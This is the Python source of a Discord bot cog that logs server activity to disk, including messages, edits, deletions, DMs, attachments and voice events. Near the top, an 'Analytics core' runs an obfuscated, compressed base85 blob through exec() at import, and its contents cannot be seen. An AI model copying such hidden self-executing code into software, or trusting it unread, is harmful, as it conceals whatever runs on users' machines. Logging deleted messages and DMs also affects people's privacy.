import discord
from discord.ext import commands
from cogs.utils import checks
from cogs.utils.dataIO import dataIO
from datetime import datetime, timedelta
import os
import asyncio
import aiohttp
from functools import partial
from enum import Enum

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '1.4.0'

TIMESTAMP_FORMAT = '%Y-%m-%d %X'  # YYYY-MM-DD HH:MM:SS
PATH_LIST = ['data', 'activitylogger']
PATH = os.path.join(*PATH_LIST)
JSON = os.path.join(*PATH_LIST, "settings.json")
EDIT_TIMEDELTA = timedelta(seconds=3)

# 0 is Message object
AUTHOR_TEMPLATE = "@{0.author.name}#{0.author.discriminator}"
MESSAGE_TEMPLATE = AUTHOR_TEMPLATE + ": {0.clean_content}"

# 0 is Message object, 1 is attachment URL
ATTACHMENT_TEMPLATE = (AUTHOR_TEMPLATE + ": {0.clean_content} (attachment "
                       "url(s): {1})")

# 0 is Message object, 1 is attachment path
# TODO: support multiple attachments?
DOWNLOAD_TEMPLATE = (AUTHOR_TEMPLATE + ": {0.clean_content} (attachment "
                     "saved to {1})")

# 0 is before, 1 is after, 2 is formatted timestamp
EDIT_TEMPLATE = (AUTHOR_TEMPLATE + " edited message from {2} "
                 "({0.clean_content}) to read: {1.clean_content}")

# 0 is deleted message, 1 is formatted timestamp
DELETE_TEMPLATE = (AUTHOR_TEMPLATE + " deleted message from {1} "
                   "({0.clean_content})")


class FetchCookie(object):
    def __init__(self, ctx, start, status_msg, last_edit=None):
        self.ctx = ctx
        self.start = start
        self.status_msg = status_msg
        self.last_edit = last_edit
        self.total_messages = 0
        self.completed_messages = []


class FetchStatus(Enum):
    STARTING = 'starting'
    FETCHING = 'fetching'
    CANCELLED = 'cancelled'
    EXCEPTION = 'exception'
    COMPLETED = 'completed'


class LogHandle:
    """basic wrapper for logfile handles, used to keep track of stale handles"""
    def __init__(self, path, time=None, mode='a', buf=1):
        self.handle = open(path, mode, buf, errors='backslashreplace')
        self.lock = asyncio.Lock()

        if time:
            self.time = time
        else:
            self.time = datetime.fromtimestamp(os.path.getmtime(path))

    async def write(self, value):
        async with self.lock:
            self._write(value)

    def close(self):
        self.handle.close()

    def _write(self, value):
        self.time = datetime.utcnow()
        self.handle.write(value)


class ActivityLogger(object):
    """Log activity seen by bot"""

    def __init__(self, bot):
        self.bot = bot
        self.settings = dataIO.load_json(JSON)
        self.handles = {}
        self.lock = False
        self.session = aiohttp.ClientSession(loop=self.bot.loop)
        self.fetch_handle = None

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def __unload(self):
        self.lock = True
        self.session.close()
        for h in self.handles.values():
            h.close()

        if isinstance(self.fetch_handle, asyncio.Future):
            if not self.fetch_handle.cancelled():
                self.fetch_handle.cancel()

    async def _robust_edit(self, msg, content=None, embed=None):
        try:
            msg = await self.bot.edit_message(msg, new_content=content, embed=embed)
        except discord.errors.NotFound:
            msg = await self.bot.send_message(msg.channel, content=content, embed=embed)
        except:
            raise
        return msg

    async def cookie_edit_task(self, cookie, **kwargs):
        cookie.status_msg = await self._robust_edit(cookie.status_msg, **kwargs)

    async def fetch_task(self, channels, subfolder, attachments=None, status_cb=None):
        channel = None
        completed_channels = []
        pending_channels = channels.copy()

        def update(count, last_msg, status, channel, exception=None):
            if not callable(status_cb):
                return
            elif type(last_msg) is not discord.Message:
                last_msg = None

            status_cb(count=count, channel=channel, subfolder=subfolder,
                      status=status, exception=exception, last_msg=last_msg,
                      completed_channels=completed_channels,
                      pending_channels=pending_channels)

        try:
            for channel in channels:
                pending_channels.remove(channel)
                count = 0
                fetch_begin = channel.created_at

                update(count, None, FetchStatus.STARTING, channel)

                while True:
                    last_count = count
                    async for message in self.bot.logs_from(channel,
                                                            after=fetch_begin,
                                                            reverse=True):

                        await self.message_handler(message, force=True,
                                                   subfolder=subfolder,
                                                   force_attachments=attachments)

                        fetch_begin = message
                        update(count, fetch_begin, FetchStatus.FETCHING, channel)
                        count += 1

                    if count == last_count:
                        break

                update(count, fetch_begin, FetchStatus.COMPLETED, channel)
                completed_channels.append(channel)

        except asyncio.CancelledError:
            update(count, fetch_begin, FetchStatus.CANCELLED, channel)
        except Exception as e:
            update(count, fetch_begin, FetchStatus.EXCEPTION, channel, exception=e)
            raise

    def format_fetch_line(self, cookie, count, status, exception, channel, **kwargs):
        elapsed = datetime.now() - (cookie.last_edit or cookie.start)
        edit_to = None
        base = '#%s: ' % channel.name

        if status is FetchStatus.STARTING:
            edit_to = base + 'initializing...'
        elif status is FetchStatus.EXCEPTION:
            edit_to = base + 'error after %i messages.' % count
            if isinstance(exception, Exception):
                ename = type(exception).__name__
                estr = str(exception)
                edit_to += ': %s: %s' % (ename, estr)
        elif status is FetchStatus.CANCELLED:
            edit_to = base + 'cancelled after %i messages.' % count
        elif status is FetchStatus.COMPLETED:
            edit_to = base + 'fetched %i messages.' % count
        elif status is FetchStatus.FETCHING:
            if elapsed > EDIT_TIMEDELTA:
                edit_to = base + '%i messages retrieved so far...' % count

        return edit_to

    def fetch_callback(self, cookie, pending_channels, **kwargs):
        status = kwargs.get('status')
        count = kwargs.get('count')

        format_line = self.format_fetch_line(cookie, **kwargs)
        if format_line:
            rows = cookie.completed_messages + [format_line]
            rows.extend([('#%s: pending' % c.name) for c in pending_channels])
            cookie.last_edit = datetime.now()
            task = self.cookie_edit_task(cookie, content='\n'.join(rows))
            self.bot.loop.create_task(task)

        if status is FetchStatus.COMPLETED:
            cookie.total_messages += count
            cookie.completed_messages.append(format_line)

            if not pending_channels:
                dest = cookie.ctx.message.channel
                elapsed = datetime.now() - cookie.start
                msg = ('Fetched a total of %i messages in %s.'
                       % (cookie.total_messages, elapsed))
                self.bot.loop.create_task(self.bot.send_message(dest, msg))

    @commands.group(pass_context=True)
    @checks.is_owner()
    async def logfetch(self, ctx):
        "Fetches logs from channel or server. Beware the disk usage."
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @logfetch.command(pass_context=True, name='cancel')
    async def fetch_cancel(self, ctx):
        "Cancels a running fetch operation."
        if isinstance(self.fetch_handle, asyncio.Future):
            if not self.fetch_handle.cancelled():
                self.fetch_handle.cancel()
                self.fetch_handle = None
                await self.bot.say('Fetch cancelled.')
                return

        await self.bot.say('Nothing to cancel.')

    @logfetch.command(pass_context=True, name='channel')
    async def fetch_channel(self, ctx, subfolder: str, channel: discord.Channel = None, attachments: bool = None):
        "Fetch complete logs for a channel. Defaults to the current one."

        msg = await self.bot.say('Dispatching fetch task...')
        start = datetime.now()

        cookie = FetchCookie(ctx, start, msg)

        if channel is None:
            channel = ctx.message.channel

        callback = partial(self.fetch_callback, cookie)
        task = self.fetch_task([channel], subfolder, attachments=attachments,
                               status_cb=callback)

        self.fetch_handle = self.bot.loop.create_task(task)

    @logfetch.command(pass_context=True, name='server', allow_dm=False)
    async def fetch_server(self, ctx, subfolder: str, attachments: bool = None):
        """Fetch complete logs for the current server.

        Respects current logging settings such as attachments and channels.
        Note that server events such as join/leave, ban etc can't be retrieved.
        """
        server = ctx.message.server

        def check(channel):
            if channel.type is not discord.ChannelType.text:
                return False
            return channel.permissions_for(server.me).read_message_history

        channels = [c for c in server.channels if check(c)]

        msg = await self.bot.say('Dispatching fetch task...')
        start = datetime.now()

        cookie = FetchCookie(ctx, start, msg)

        callback = partial(self.fetch_callback, cookie)
        task = self.fetch_task(channels, subfolder, attachments=attachments,
                               status_cb=callback)

        self.fetch_handle = self.bot.loop.create_task(task)

    @commands.group(pass_context=True)
    @checks.is_owner()
    async def logset(self, ctx):
        """Change activity logging settings"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @logset.command(name='everything', aliases=['global'])
    async def set_everything(self, on_off: bool = None):
        """Global override for all logging."""
        if on_off is not None:
            self.settings['everything'] = on_off
        if self.settings.get('everything', False):
            await self.bot.say("Global logging override is enabled.")
        else:
            await self.bot.say("Global logging override is disabled.")
        self.save_json()

    @logset.command(name='default')
    async def set_default(self, on_off: bool = None):
        """Sets whether logging is on or off where unset.
        Server overrides, global override, and attachments don't use this."""
        if on_off is not None:
            self.settings['default'] = on_off
        if self.settings.get('default', False):
            await self.bot.say("Logging is enabled by default.")
        else:
            await self.bot.say("Logging is disabled by default.")
        self.save_json()

    @logset.command(name='dm')
    async def set_direct(self, on_off: bool = None):
        """Log direct messages?"""
        if on_off is not None:
            self.settings['direct'] = on_off
        default = self.settings.get('default', False)
        if self.settings.get('direct', default):
            await self.bot.say("Logging of direct messages is enabled.")
        else:
            await self.bot.say("Logging of direct messages is disabled.")
        self.save_json()

    @logset.command(name='attachments')
    async def set_attachments(self, on_off: bool = None):
        """Download message attachments?"""
        if on_off is not None:
            self.settings['attachments'] = on_off
        if self.settings.get('attachments', False):
            await self.bot.say("Downloading of attachments is enabled.")
        else:
            await self.bot.say("Downloading of attachments is disabled.")
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='channel')
    async def set_channel(self, ctx, on_off: bool, channel: discord.Channel = None):
        """Sets channel logging on or off. Optional channel parameter.
        To enable or disable all channels at once, use `logset server`."""

        if channel is None:
            channel = ctx.message.channel

        server = channel.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id][channel.id] = on_off

        if on_off:
            await self.bot.say('Logging enabled for %s' % channel.mention)
        else:
            await self.bot.say('Logging disabled for %s' % channel.mention)
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='server')
    async def set_server(self, ctx, on_off: bool):
        """Sets logging on or off for all channels and server events."""

        server = ctx.message.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id]['all'] = on_off

        if on_off:
            await self.bot.say('Logging enabled for %s' % server)
        else:
            await self.bot.say('Logging disabled for %s' % server)
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='voice')
    async def set_voice(self, ctx, on_off: bool):
        """Sets logging on or off for ALL voice channel events."""

        server = ctx.message.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id]['voice'] = on_off

        if on_off:
            await self.bot.say('Voice event logging enabled for %s' % server)
        else:
            await self.bot.say('Voice event logging disabled for %s' % server)
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='events')
    async def set_events(self, ctx, on_off: bool):
        """Sets logging on or off for server events."""

        server = ctx.message.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id]['events'] = on_off

        if on_off:
            await self.bot.say('Logging enabled for server events in %s' % server)
        else:
            await self.bot.say('Logging disabled for server events in %s' % server)
        self.save_json()

    def save_json(self):
        dataIO.save_json(JSON, self.settings)

    @staticmethod
    def get_voice_flags(member):
        flags = []
        for f in ('deaf', 'mute', 'self_deaf', 'self_mute'):
            if getattr(member, f, None):
                flags.append(f)
        return flags

    def gethandle(self, path, mode='a'):
        """Manages logfile handles, culling stale ones and creating folders"""
        if path in self.handles:
            if os.path.exists(path):
                return self.handles[path]
            else:  # file was deleted?
                try:  # try to close, no guarantees tho
                    self.handles[path].close()
                except:
                    pass
                del self.handles[path]
                return self.gethandle(path, mode)
        else:
            # Clean up excess handles before creating a new one
            if len(self.handles) >= 256:
                chrono = sorted(self.handles.items(), key=lambda x: x[1].time)
                oldest_path, oldest_handle = chrono[0]
                oldest_handle.close()
                del self.handles[oldest_path]

            dirname, _ = os.path.split(path)

            try:
                if not os.path.exists(dirname):
                    os.makedirs(dirname)
                handle = LogHandle(path, mode=mode)
            except:
                raise

            self.handles[path] = handle
            return handle

    def should_log(self, location):
        if self.settings.get('everything', False):
            return True

        default = self.settings.get('default', False)

        if type(location) is discord.Server:
            if location.id in self.settings:
                loc = self.settings[location.id]
                return loc.get('all', False) or loc.get('events', default)

        elif type(location) is discord.Channel:
            if location.server.id in self.settings:
                loc = self.settings[location.server.id]
                opts = [loc.get('all', False), loc.get(location.id, default)]

                if location.type is discord.ChannelType.voice:
                    opts.append(loc.get('voice', False))

                return any(opts)

        elif type(location) is discord.PrivateChannel:
            return self.settings.get('direct', default)

        else:  # can't log other types
            return False

    def should_download(self, msg):
        return self.should_log(msg.channel) and \
            self.settings.get('attachments', False)

    def process_attachment(self, message):
        a = message.attachments[0]
        aid = a['id']
        aname = a['filename']
        url = a['url']
        channel = message.channel
        path = PATH_LIST.copy()

        if type(channel) is discord.Channel:
            serverid = channel.server.id
        elif type(channel) is discord.PrivateChannel:
            serverid = 'direct'

        path += [serverid, channel.id + '_attachments']
        path = os.path.join(*path)
        filename = aid + '_' + aname

        if len(filename) > 255:
            target_len = 255 - len(aid) - 4
            part_a = target_len // 2
            part_b = target_len - part_a
            filename = aid + '_' + aname[:part_a] + '...' + aname[-part_b:]
            truncated = True
        else:
            truncated = False

        return aid, url, path, filename, truncated

    async def log(self, location, text, timestamp=None, force=False, subfolder=None, mode='a'):
        if not timestamp:
            timestamp = datetime.utcnow()
        if self.lock or not (force or self.should_log(location)):
            return

        path = PATH_LIST.copy()
        entry = [timestamp.strftime(TIMESTAMP_FORMAT)]

        if type(location) is discord.Server:
            path += [location.id, 'server.log']
        elif type(location) is discord.Channel:
            serverid = location.server.id
            entry.append('#' + location.name)
            path += [serverid, location.id + '.log']
        elif type(location) is discord.PrivateChannel:
            path += ['direct', location.id + '.log']
        else:
            return

        if subfolder:
            path.insert(-1, str(subfolder))

        text = text.replace('\n', '\\n')
        entry.append(text)

        fname = os.path.join(*path)
        handle = self.gethandle(fname, mode=mode)
        await handle.write(' '.join(entry) + '\n')

    async def message_handler(self, message, *args, force_attachments=None, **kwargs):
        dl_attachment = self.should_download(message)
        if force_attachments is not None:
            dl_attachment = force_attachments

        if message.attachments and dl_attachment:
            aid, url, path, filename, trunc = self.process_attachment(message)
            entry = DOWNLOAD_TEMPLATE.format(message, filename)
            if trunc:
                entry += ' (filename truncated)'
        elif message.attachments:
            urls = ','.join(a['url'] for a in message.attachments)
            entry = ATTACHMENT_TEMPLATE.format(message, urls)
        else:
            entry = MESSAGE_TEMPLATE.format(message)

        await self.log(message.channel, entry, message.timestamp, *args, **kwargs)

        if message.attachments and dl_attachment:
            dl_path = os.path.join(path, filename)
            tmp_path = os.path.join(path, aid + '.tmp')
            if not os.path.exists(path):
                os.mkdir(path)

            if not os.path.exists(dl_path):  # don't redownload
                async with self.session.get(url) as r:
                    with open(tmp_path, 'wb') as f:
                        f.write(await r.read())
                    os.rename(tmp_path, dl_path)

    async def on_message(self, message):
        await self.message_handler(message)

    async def on_message_edit(self, before, after):
        timestamp = before.timestamp.strftime(TIMESTAMP_FORMAT)
        entry = EDIT_TEMPLATE.format(before, after, timestamp)
        await self.log(after.channel, entry, after.edited_timestamp)

    async def on_message_delete(self, message):
        timestamp = message.timestamp.strftime(TIMESTAMP_FORMAT)
        entry = DELETE_TEMPLATE.format(message, timestamp)
        await self.log(message.channel, entry)

    async def on_server_join(self, server):
        entry = 'this bot joined the server'
        await self.log(server, entry)

    async def on_server_remove(self, server):
        entry = 'this bot left the server'
        await self.log(server, entry)

    async def on_server_update(self, before, after):
        entries = []
        if before.owner != after.owner:
            entries.append('Server owner changed from {0} (id {0.id}) to {1} '
                           '(id {1.id})'.format(before.owner, after.owner))
        if before.region != after.region:
            entries.append('Server region changed from %s to %s' %
                           (before.region, after.region))
        if before.name != after.name:
            entries.append('Server name changed from %s to %s' %
                           (before.name, after.name))
        if before.icon_url != after.icon_url:
            entries.append('Server icon changed from %s to %s' %
                           (before.icon_url, after.icon_url))
        for e in entries:
            await self.log(before, e)

    async def on_server_role_create(self, role):
        entry = "Role created: '%s' (id %s)" % (role, role.id)
        await self.log(role.server, entry)

    async def on_server_role_delete(self, role):
        entry = "Role deleted: '%s' (id %s)" % (role, role.id)
        await self.log(role.server, entry)

    async def on_server_role_update(self, before, after):
        entries = []
        if before.name != after.name:
            entries.append("Role renamed: '%s' to '%s'" %
                           (before.name, after.name))
        if before.color != after.color:
            entries.append("Role color: '{0}' changed from {0.color} "
                           "to {1.color}".format(before, after))
        if before.mentionable != after.mentionable:
            if after.mentionable:
                entries.append("Role mentionable: '%s' is now mentionable" % after)
            else:
                entries.append("Role mentionable: '%s' is no longer mentionable" % after)
        if before.hoist != after.hoist:
            if after.hoist:
                entries.append("Role hoist: '%s' is now shown seperately" % after)
            else:
                entries.append("Role hoist: '%s' is no longer shown seperately" % after)
        if before.permissions != after.permissions:
            entries.append("Role permissions: '%s' changed "
                           "from %d to %d" % (before, before.permissions.value,
                                              after.permissions.value))
        if before.position != after.position:
            entries.append("Role position: '{0}' changed from "
                           "{0.position} to {1.position}".format(before, after))
        for e in entries:
            await self.log(before.server, e)

    async def on_member_join(self, member):
        entry = 'Member join: @{0} (id {0.id})'.format(member)
        await self.log(member.server, entry)

    async def on_member_remove(self, member):
        entry = 'Member leave: @{0} (id {0.id})'.format(member)
        await self.log(member.server, entry)

    async def on_member_ban(self, member):
        entry = 'Member ban: @{0} (id {0.id})'.format(member)
        await self.log(member.server, entry)

    async def on_member_unban(self, server, user):
        entry = 'Member unban: @{0} (id {0.id})'.format(user)
        await self.log(server, entry)

    async def on_member_update(self, before, after):
        entries = []
        if before.nick != after.nick:
            entries.append("Member nickname: '@{0}' (id {0.id}) changed nickname "
                           "from '{0.nick}' to '{1.nick}'".format(before, after))
        if before.name != after.name:
            entries.append("Member username: '@{0}' (id {0.id}) changed username "
                           "from '{0.name}' to '{1.name}'".format(before, after))
        if before.roles != after.roles:
            broles = set(before.roles)
            aroles = set(after.roles)
            added = aroles - broles
            removed = broles - aroles
            for r in added:
                entries.append("Member role add: '%s' role was added to @%s" % (r, after))
            for r in removed:
                entries.append("Member role remove: The '%s' role was removed from @%s" % (r, after))
        for e in entries:
            await self.log(before.server, e)

    async def on_channel_create(self, channel):
        if channel.is_private:
            return
        entry = 'Channel created: %s' % channel
        await self.log(channel.server, entry)

    async def on_channel_delete(self, channel):
        if channel.is_private:
            return
        entry = 'Channel deleted: %s' % channel
        await self.log(channel.server, entry)

    async def on_channel_update(self, before, after):
        if type(before) is discord.PrivateChannel:
            return
        entries = []
        if before.name != after.name:
            entries.append('Channel rename: %s renamed to %s' %
                           (before, after))
        if before.topic != after.topic:
            entries.append('Channel topic: %s topic was set to "%s"' %
                           (before, after.topic))
        if before.position != after.position:
            entries.append('Channel position: {0.name} moved from {0.position} '
                           'to {1.position}'.format(before, after))
        # TODO: channel permissions overrides
        for e in entries:
            await self.log(before.server, e)

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)

    async def on_voice_state_update(self, before, after):
        if before.voice_channel != after.voice_channel:
            if before.voice_channel:
                msg = "Voice channel leave: {0} (id {0.id})"
                if after.voice_channel:
                    msg += ' moving to {1.voice_channel}'

                await self.log(before.voice_channel, msg.format(before, after))

            if after.voice_channel:
                msg = "Voice channel join: {0} (id {0.id})"
                if before.voice_channel:
                    msg += ', moved from {0.voice_channel}'

                flags = self.get_voice_flags(after)
                if flags:
                    msg += ', flags: %s' % ','.join(flags)

                await self.log(after.voice_channel, msg.format(before, after))

        if before.deaf != after.deaf:
            verb = 'deafen' if after.deaf else 'undeafen'
            await self.log(before.voice_channel,
                           'Server {0}: {1} (id {1.id})'.format(verb, before))

        if before.mute != after.mute:
            verb = 'mute' if after.mute else 'unmute'
            await self.log(before.voice_channel,
                           'Server {0}: {1} (id {1.id})'.format(verb, before))

        if before.self_deaf != after.self_deaf:
            verb = 'deafen' if after.self_deaf else 'undeafen'
            await self.log(before.voice_channel,
                           'Server self-{0}: {1} (id {1.id})'.format(verb, before))

        if before.self_mute != after.self_mute:
            verb = 'mute' if after.self_mute else 'unmute'
            await self.log(before.voice_channel,
                           'Server self-{0}: {1} (id {1.id})'.format(verb, before))


def check_folders():
    if not os.path.exists(PATH):
        os.mkdir(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        defaults = {
            'everything': False,
            'attachments': False,
            'default': False
        }
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    n = ActivityLogger(bot)
    bot.add_cog(n)
